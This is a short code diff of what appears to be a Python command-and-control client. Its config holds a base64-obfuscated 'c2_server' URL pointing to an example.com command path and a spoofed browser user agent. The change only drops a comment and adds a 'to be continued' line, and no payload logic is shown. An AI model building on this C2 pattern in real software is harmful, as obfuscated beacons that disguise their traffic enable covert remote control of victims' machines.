@@ -20,7 +20,6 @@ from Crypto.Util.Padding import pad
 import argparse
 import requests
 
-# Configuration
 CONFIG = {
     'c2_server': base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8'),
     'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -332,3 +331,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+# TO BE CONTINUED STAY tuned
